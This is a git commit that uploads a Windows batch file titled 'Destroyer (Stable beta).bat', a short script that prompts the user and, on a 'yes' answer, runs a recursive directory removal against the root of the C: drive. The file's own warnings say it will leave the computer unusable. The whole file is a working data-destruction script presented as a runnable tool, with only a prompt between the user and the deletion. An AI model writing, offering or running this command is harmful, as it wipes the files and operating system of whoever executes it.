183a1f5add7c0358a3f457a9511e914a1adfacdc
Telefony i komputery <phonecollector2025@gmail.com>
2025-02-27 17:39:54 +0100

    Add files via upload

---
+++ Destroyer (Stable beta).bat
@@ -0,0 +1,18 @@
+@echo off
+:1
+color a
+echo What have you just executed will damage your files. Make sure you're using safe environment before executing this script. Do you want to continue running this script resulting in an unusable computer? (answer in only yes/no)
+set /p input=
+if /i %input%==yes goto delete
+if /i %input%==no goto save
+if /i not %input%== yes,no goto 1
+
+:delete
+echo Last warning! If you click on y and enter, your computer will be cooked
+timeout 10
+rd c:\ /s
+pause
+exit
+:save
+pause
+exit
